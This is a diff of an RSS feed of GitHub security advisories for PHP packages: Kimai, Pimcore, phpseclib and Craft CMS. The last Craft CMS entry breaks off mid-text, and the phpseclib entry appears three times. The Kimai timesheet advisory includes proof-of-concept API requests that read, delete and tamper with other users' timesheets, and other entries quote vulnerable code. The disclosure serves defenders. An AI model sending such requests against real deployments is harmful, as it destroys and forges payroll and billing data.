@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-05-06T17:05:11.338Z</updated>
+    <updated>2026-05-06T18:52:13.313Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,703 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[kimai/kimai] Kimai's Twig function config() leaks server-wide secrets (LDAP bind password, SAML SP private key) via invoice/export templates]]></title>
+        <id>https://github.com/advisories/GHSA-vrqv-52x7-rm4v</id>
+        <link href="https://github.com/advisories/GHSA-vrqv-52x7-rm4v"/>
+        <updated>2026-05-06T18:42:31.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Kimai's Twig sandbox (<code>StrictPolicy</code>, used for admin-uploaded invoice and export templates) allow-lists the <code>config()</code> Twig function with no key filtering. <code>config(name)</code> delegates to <code>App\Configuration\SystemConfiguration::find($name)</code>, which returns arbitrary entries from the flattened <code>kimai.config</code> container parameter built in <code>App\DependencyInjection\AppExtension::loadInternal()</code>. Any admin who can upload a Twig template can therefore render server-wide secrets - the LDAP bind password, the SAML SP private key, and any other dotted configuration key populated from <code>kimai.yaml</code> - into the invoice or export output, which is then delivered to whoever generates an invoice or export from that template (including lower-privileged users such as teamleads with invoice permissions). This is a second, uncovered class of the same defense-in-depth issue patched in GHSA-rh42-6rj2-xwmc: the previous fix added a User-method blocklist but left the <code>config()</code> function unrestricted.</p>
+<h3 id="details">Details</h3>
+<p><code>src/Twig/SecurityPolicy/StrictPolicy.php:40-55</code> explicitly allow-lists <code>'config'</code>:</p>
+<pre><code class="language-php">private array $allowedFunctions = [
+    'max', 'min', 'range', 'constant', 'cycle', 'random', 'date',
+    't',
+    'encore_entry_css_source', 'encore_entry_link_tags', 'encore_entry_script_tags',
+    'is_granted',
+    'qr_code_data_uri',
+    'config',                       // &lt;-- sink, no key filter
+    'create_date', 'month_names', 'locale_format',
+    'class_name'
+];
+</code></pre>
+<p><code>src/Twig/Configuration.php:22-45</code> is the Twig function implementation:</p>
+<pre><code class="language-php">public function getFunctions(): array
+{
+    return [new TwigFunction('config', [$this, 'get'])];
+}
+
+public function get(string $name)
+{
+    switch ($name) {
+        case 'chart-class':                     return '';
+        case 'theme.chart.background_color':    return '#3c8dbc';
+        // ... 4 more theme constants
+    }
+    return $this-&gt;configuration-&gt;find($name);   // &lt;-- arbitrary key lookup
+}
+</code></pre>
+<p><code>App\Configuration\SystemConfiguration::find()</code> at <code>src/Configuration/SystemConfiguration.php:54-62</code> is a direct dictionary lookup. The dictionary <code>$this-&gt;settings</code> is initialised from the <code>kimai.config</code> container parameter, which the <code>AppExtension</code> flattens from <code>kimai.yaml</code> into dotted-notation keys.</p>
+<pre><code>
+The LDAP and SAML schemas declared in `src/DependencyInjection/Configuration.php` define secret-valued scalar nodes that survive the flattening and become reachable keys:
+
+```php
+// getLdapNode()
+-&gt;arrayNode('connection')
+    -&gt;children()
+        -&gt;scalarNode('host')-&gt;defaultNull()-&gt;end()
+        -&gt;scalarNode('username')-&gt;end()
+        -&gt;scalarNode('password')-&gt;end()       // -&gt; settings['ldap.connection.password']
+        ...
+
+// getSamlNode()
+-&gt;arrayNode('sp')
+    -&gt;children()
+        -&gt;scalarNode('x509cert')-&gt;end()
+        -&gt;scalarNode('privateKey')-&gt;end()     // -&gt; settings['saml.connection.sp.privateKey']
+        ...
+</code></pre>
+<p>The invoice and export renderers both enable the sandbox against <code>StrictPolicy</code> and pass the shared Twig environment - the one with the <code>config</code> function registered - into sandboxed rendering: <code>src/Invoice/Renderer/AbstractTwigRenderer.php:66-74</code> and <code>src/Export/Base/{PDFRenderer,HtmlRenderer}.php</code>. An admin who uploads a malicious invoice or export template therefore gets an unrestricted read primitive against <code>kimai.config</code>.</p>
+<p>In a real deployment the attacker template is uploaded through the admin UI (ROLE_SUPER_ADMIN, permission <code>upload_invoice_template</code>), saved by <code>src/Invoice/InvoiceTemplate*</code> and later rendered by whoever generates an invoice or export for that template. The rendering user is typically a teamlead or admin with invoice permission (<code>INVOICE</code> permission set: <code>['view_invoice','create_invoice','manage_invoice_template']</code>, granted to ROLE_ADMIN and ROLE_TEAMLEAD in <code>config/packages/kimai.yaml</code>). The rendered output is returned as the invoice PDF/HTML or as a CSV/XLSX export, so the secrets land in a document that is routinely downloaded and emailed.</p>
+<h3 id="impact">Impact</h3>
+<p>Any Kimai deployment that (a) has SAML or LDAP configured in <code>kimai.yaml</code>, and (b) has at least one user (other than the current SUPER_ADMIN) who will render a template-based invoice or export in the future, is affected. A malicious or compromised SUPER_ADMIN can upload a template once, leave, and subsequent invoice or export generations by teamleads or other admins silently exfiltrate <code>ldap.connection.password</code>, <code>saml.connection.sp.privateKey</code>, <code>saml.connection.sp.x509cert</code>, and any other dotted configuration key into an attacker-readable artifact. The LDAP bind password gives domain-credential access to the company directory and often to every downstream system that trusts the same directory; the SAML SP private key allows an attacker to forge signed SAML assertions to any service provider that trusts the same key pair. This is the same class of defense-in-depth leak that GHSA-rh42-6rj2-xwmc patched for user-level secrets, at a broader impact because the keys leaked here are system-wide rather than per-user, and the current StrictPolicy does not intercept the <code>config()</code> call path. </p>
+<h3 id="solution">Solution</h3>
+<p>The <code>config()</code> function was patched to only return a pre-configured list of settings in sandboxed mode. </p>
+<p>Additional checks were added to prevent access to configs that start with <code>saml.</code> or <code>ldap.</code>.</p>
+<p>Kimai will not issue a CVE, because this requires a SUPER_ADMIN account and it only affects system with activated LDAP or SAML, which also uses the invoice system.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kimai/kimai/security/advisories/GHSA-vrqv-52x7-rm4v">https://github.com/kimai/kimai/security/advisories/GHSA-vrqv-52x7-rm4v</a></li>
+<li><a href="https://github.com/advisories/GHSA-vrqv-52x7-rm4v">https://github.com/advisories/GHSA-vrqv-52x7-rm4v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vrqv-52x7-rm4v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-06T18:42:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore has an authenticated Cross-site Scripting issue]]></title>
+        <id>https://github.com/advisories/GHSA-7gxw-q9j5-mrj4</id>
+        <link href="https://github.com/advisories/GHSA-7gxw-q9j5-mrj4"/>
+        <updated>2026-05-06T18:40:18.000Z</updated>
+        <content type="html"><![CDATA[<p>An authenticated attacker with permission to edit document content can store crafted HTML/JavaScript in a Document embed editable and cause script execution when the published page is rendered.</p>
+<p>This issue affects pimcore: v12.3.3.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5362">https://nvd.nist.gov/vuln/detail/CVE-2026-5362</a></li>
+<li><a href="https://fluidattacks.com/es/advisories/mago">https://fluidattacks.com/es/advisories/mago</a></li>
+<li><a href="https://github.com/pimcore/pimcore">https://github.com/pimcore/pimcore</a></li>
+<li><a href="https://github.com/advisories/GHSA-7gxw-q9j5-mrj4">https://github.com/advisories/GHSA-7gxw-q9j5-mrj4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7gxw-q9j5-mrj4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-27T21:31:03.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pimcore/pimcore] Pimcore admin users can trigger SQL Injection]]></title>
+        <id>https://github.com/advisories/GHSA-c8g3-x47w-8q7p</id>
+        <link href="https://github.com/advisories/GHSA-c8g3-x47w-8q7p"/>
+        <updated>2026-05-06T18:32:17.000Z</updated>
+        <content type="html"><![CDATA[<p>An authenticated administrative user who can import or save DataObject class definitions can inject attacker-controlled composite index metadata and trigger unintended SQL execution in the backend.</p>
+<p>This issue affects pimcore: 12.3.3.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5394">https://nvd.nist.gov/vuln/detail/CVE-2026-5394</a></li>
+<li><a href="https://fluidattacks.com/es/advisories/dragons">https://fluidattacks.com/es/advisories/dragons</a></li>
+<li><a href="https://github.com/pimcore/pimcore">https://github.com/pimcore/pimcore</a></li>
+<li><a href="https://github.com/pimcore/pimcore/pull/19108">https://github.com/pimcore/pimcore/pull/19108</a></li>
+<li><a href="https://github.com/advisories/GHSA-c8g3-x47w-8q7p">https://github.com/advisories/GHSA-c8g3-x47w-8q7p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c8g3-x47w-8q7p</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-27T21:31:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[kimai/kimai] Kimai has Missing Voter Check that Allows Cross-Team Timesheet Manipulation]]></title>
+        <id>https://github.com/advisories/GHSA-9g2q-w3w2-vf7q</id>
+        <link href="https://github.com/advisories/GHSA-9g2q-w3w2-vf7q"/>
+        <updated>2026-05-06T18:28:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Any ROLE_TEAMLEAD user can enumerate, read, modify, and permanently delete timesheets belonging to any other user in the system — regardless of team membership. This enables data destruction (deleted billable hours), data tampering (forged timesheet durations), and full authorization bypass on timesheet resources. Verified against Kimai 2.52.0.</p>
+<h3 id="details">Details</h3>
+<p><code>TimesheetVoter::voteOnAttribute()</code> maps permissions to <code>own_timesheet</code> or <code>other_timesheet</code> without checking team membership. The voter's own comment confirms this is a known gap:</p>
+<pre><code class="language-php">// extend me for "team" support later on
+if ($subject-&gt;getUser()?-&gt;getId() === $user-&gt;getId()) {
+    $permission .= 'own';
+} else {
+    $permission .= 'other';
+}
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>Tested against Kimai 2.52.0 Docker instance.</p>
+<p>Setup:</p>
+<ul>
+<li>User A (usera, ROLE_TEAMLEAD) owns timesheet ID 2 with description "Private timesheet - UserA only"</li>
+<li>User B (userb, ROLE_TEAMLEAD) is NOT on any team with User A</li>
+</ul>
+<p><strong>User B reads User A's timesheet data:</strong></p>
+<pre><code>GET /api/timesheets/2 HTTP/1.1
+X-AUTH-USER: userb
+X-AUTH-TOKEN: &lt;userb_api_token&gt;
+</code></pre>
+<p>Response: HTTP 200 — returns full timesheet record including description "Private timesheet - UserA only".</p>
+<p><strong>User B deletes User A's timesheet:</strong></p>
+<pre><code>DELETE /api/timesheets/3 HTTP/1.1
+X-AUTH-USER: userb
+X-AUTH-TOKEN: &lt;userb_api_token&gt;
+</code></pre>
+<p>Response: HTTP 204 No Content — timesheet permanently deleted.</p>
+<p><strong>User B tampers User A's timesheet:</strong></p>
+<pre><code>PATCH /api/timesheets/6 HTTP/1.1
+X-AUTH-USER: userb
+X-AUTH-TOKEN: &lt;userb_api_token&gt;
+Content-Type: application/json
+
+{"begin":"2026-03-24T08:00:00","end":"2026-03-24T18:00:00","project":1,"activity":1,"description":"TAMPERED","exported":false,"billable":false}
+</code></pre>
+<p>Response: HTTP 200 OK — duration inflated from 3600s to 36000s, description overwritten.</p>
+<p><strong>Note:</strong> ROLE_USER (userc) is correctly blocked — DELETE returns 403 and the actions endpoint returns an empty array. The vulnerability only affects ROLE_TEAMLEAD and above. Timesheet IDs are sequential integers, trivially enumerable.</p>
+<h3 id="impact">Impact</h3>
+<p>Any authenticated user with ROLE_TEAMLEAD or above can:</p>
+<ol>
+<li>Permanently delete timesheets belonging to any user system-wide — destroying billable hours, payroll data, and project billing history</li>
+<li>Silently alter timesheet descriptions, hours, and billing flags — forging hours up or down, directly affecting invoicing and payroll</li>
+<li>Enumerate all timesheet IDs (sequential integers) and access action metadata for arbitrary records</li>
+</ol>
+<p>No user interaction required. ROLE_USER accounts are correctly restricted; the vulnerability is specific to ROLE_TEAMLEAD receiving global scope instead of team-scoped access.</p>
+<h3 id="maintainers-answer-why-this-is-not-eligible-for-a-cve">Maintainers answer: why this is not eligible for a CVE</h3>
+<p>The behavior described matches the documented permission model. Per the Kimai documentation, the relevant permissions granted to <code>ROLE_TEAMLEAD</code> are:</p>
+<ul>
+<li><code>edit_other_timesheet</code> — Edit existing records of other users</li>
+<li><code>delete_other_timesheet</code> — Delete existing records of other users</li>
+</ul>
+<p>These permissions were global by design, not team-scoped. The UI surfaces only the teamlead's own team timesheets, but the API has historically honored these permissions as documented: a role holding <code>*_other_timesheet</code> can act on any other user's timesheet. The inline comment <code>// extend me for "team" support later on</code> reflects this accurately — team-scoped enforcement was a planned enhancement, not a security control that existed and failed.</p>
+<p>The report frames this as authorization bypass, but no authorization boundary is being crossed: <code>ROLE_TEAMLEAD</code> is operating within its documented permissions.</p>
+<p>Kimai acknowledges that this behavior might not be expected, so while it will be treated as a feature request for team-scoped permission enforcement and not a vulnerability, it still track it as having security implications.</p>
+<h3 id="solution">Solution</h3>
+<p>Team-scoped timesheet permission checks were added in 2.56.0.</p>
+<p>Operators of Kimai &lt;= 2.55 who need stricter isolation between teamleads should not grant <code>ROLE_TEAMLEAD</code> to users who must not act on other teams' timesheets.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/kimai/kimai/security/advisories/GHSA-9g2q-w3w2-vf7q">https://github.com/kimai/kimai/security/advisories/GHSA-9g2q-w3w2-vf7q</a></li>
+<li><a href="https://github.com/advisories/GHSA-9g2q-w3w2-vf7q">https://github.com/advisories/GHSA-9g2q-w3w2-vf7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9g2q-w3w2-vf7q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-06T18:28:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: guardrails needed on isPrime and randomPrime]]></title>
+        <id>https://github.com/advisories/GHSA-2528-jw5q-ww88</id>
+        <link href="https://github.com/advisories/GHSA-2528-jw5q-ww88"/>
+        <updated>2026-05-06T17:57:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Anyone trying to generate a prime and testing the primality of a number.</p>
+<h3 id="patches">Patches</h3>
+<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Using the GMP extension would probably help, assuming that one has its own guardrails.</p>
+<h3 id="resources">Resources</h3>
+<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a>
+<a href="https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf">https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
+<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
+<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
+<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html</a></li>
+<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-2528-jw5q-ww88">https://github.com/advisories/GHSA-2528-jw5q-ww88</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2528-jw5q-ww88</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:57:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: guardrails needed on isPrime and randomPrime]]></title>
+        <id>https://github.com/advisories/GHSA-2528-jw5q-ww88</id>
+        <link href="https://github.com/advisories/GHSA-2528-jw5q-ww88"/>
+        <updated>2026-05-06T17:57:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Anyone trying to generate a prime and testing the primality of a number.</p>
+<h3 id="patches">Patches</h3>
+<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Using the GMP extension would probably help, assuming that one has its own guardrails.</p>
+<h3 id="resources">Resources</h3>
+<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a>
+<a href="https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf">https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
+<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
+<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
+<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html</a></li>
+<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-2528-jw5q-ww88">https://github.com/advisories/GHSA-2528-jw5q-ww88</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2528-jw5q-ww88</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:57:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[phpseclib/phpseclib] phpseclib: guardrails needed on isPrime and randomPrime]]></title>
+        <id>https://github.com/advisories/GHSA-2528-jw5q-ww88</id>
+        <link href="https://github.com/advisories/GHSA-2528-jw5q-ww88"/>
+        <updated>2026-05-06T17:57:11.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Anyone trying to generate a prime and testing the primality of a number.</p>
+<h3 id="patches">Patches</h3>
+<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>Using the GMP extension would probably help, assuming that one has its own guardrails.</p>
+<h3 id="resources">Resources</h3>
+<p><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a>
+<a href="https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf">https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-599-shi-bing.pdf</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88">https://github.com/phpseclib/phpseclib/security/advisories/GHSA-2528-jw5q-ww88</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27354">https://nvd.nist.gov/vuln/detail/CVE-2024-27354</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698">https://github.com/phpseclib/phpseclib/commit/2870c8fab3f132d2ed40a66c97a36fe5ab625698</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575">https://github.com/phpseclib/phpseclib/commit/ad5dbdf2129f5e0fb644637770b7f33de8ca8575</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56">https://github.com/phpseclib/phpseclib/commit/c55b75199ec8d12cec6eadf6da99da4a3712fe56</a></li>
+<li><a href="https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b">https://gist.github.com/katzj/ee72f3c2a00590812b2ea3c0c8890e0b</a></li>
+<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2024-27354.yaml</a></li>
+<li><a href="https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49">https://github.com/phpseclib/phpseclib/blob/master/phpseclib/Math/PrimeField.php#L49</a></li>
+<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00002.html</a></li>
+<li><a href="https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html">https://lists.debian.org/debian-lts-announce/2024/03/msg00003.html</a></li>
+<li><a href="https://github.com/advisories/GHSA-2528-jw5q-ww88">https://github.com/advisories/GHSA-2528-jw5q-ww88</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2528-jw5q-ww88</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:57:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS's Missing Volume Permission Check in AssetsController::actionShowInFolder Allows Information Disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-33m5-hqp9-97pw</id>
+        <link href="https://github.com/advisories/GHSA-33m5-hqp9-97pw"/>
+        <updated>2026-05-06T17:54:48.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>AssetsController::actionShowInFolder()</code> fetches an asset by ID and returns its filename and complete folder hierarchy (including volume handle, volume UID, folder names, folder UIDs, and folder URI paths) without checking whether the requesting user has <code>viewAssets</code> or <code>viewPeerAssets</code> permission on the asset’s volume. Any authenticated CP user — even one with zero volume permissions — can enumerate asset filenames and the full folder structure of any volume by supplying arbitrary asset IDs.</p>
+<p>This follows the exact same incomplete-patch pattern as four GHSAs merged on 2026-02-25 (GHSA-x76w-8c62-48mg, GHSA-vgjg-248p-rfm2, GHSA-5pgf-h923-m958, GHSA-3pvf-vxrv-hh9c), all of which added <code>requireVolumePermissionByAsset()</code> + <code>requirePeerVolumePermissionByAsset()</code> to sibling AssetsController actions. The <code>actionShowInFolder</code> method was introduced thirteen days before the patch wave and was not included in it.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability is in <code>src/controllers/AssetsController.php</code> at line 1437. The method:</p>
+<ol>
+<li>Calls <code>requireCpRequest()</code> — verifies the request targets the CP, enforces <code>accessCp</code> permission via <code>Controller::_enforceAllowAnonymous()</code>, but does NOT enforce any volume-level permission.</li>
+<li>Fetches any asset by ID with <code>Asset::findOne($assetId)</code> — no <code>editable</code>/<code>savable</code> scope filter, so all assets across all volumes are reachable.</li>
+<li>Returns sensitive structural data via JSON.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Any authenticated control panel user with only <code>accessCp</code> permission can discover the filenames and complete folder structure (names, UIDs, handles, URIs) of assets in volumes they are not authorized to access.</li>
+<li>Sensitive volume structures — private document repositories, confidential media, internal file names — are exposed to any user who can log into the control panel.</li>
+<li>This enables targeted follow-up attacks: an attacker who knows a private asset’s filename and folder path may have other avenues to exfiltrate the actual file.</li>
+</ul>
+<h2 id="resources">Resources</h2>
+<p><a href="https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586">https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-33m5-hqp9-97pw">https://github.com/craftcms/cms/security/advisories/GHSA-33m5-hqp9-97pw</a></li>
+<li><a href="https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586">https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586</a></li>
+<li><a href="https://github.com/advisories/GHSA-33m5-hqp9-97pw">https://github.com/advisories/GHSA-33m5-hqp9-97pw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-33m5-hqp9-97pw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:54:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS has Potential Authenticated Remote Code Execution via Malicious Attached Behavior]]></title>
+        <id>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</id>
+        <link href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw"/>
+        <updated>2026-05-06T17:54:06.000Z</updated>
+        <content type="html"><![CDATA[<p>We identified a vulnerability in the latest version of Craft CMS which contains an input-handling flaw in a Yii object creation path that let any authenticated user inject malicious configuration and execute arbitrary commands on the server.  Yii’s dynamic object configuration, as implemented in Craft CMS, is a feature that lets the application build parts of itself from a settings list.</p>
+<p>This is largely a continuation of <a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a>, but through a different path that was not mitigated in the original.</p>
+<p>The request-controlled condition field layouts data is converted into a live FieldLayout object without a <code>Component::cleanseConfig()</code> boundary. Because Craft configures models before <code>parent::__construct()</code>, attacker-controlled special config keys can take effect during object creation, and FieldLayout initialization then triggers a same-request event.</p>
+<p>This appears to be another variant of the recent object-config / behavior-injection bug family, but via the condition / field layout hydration path.</p>
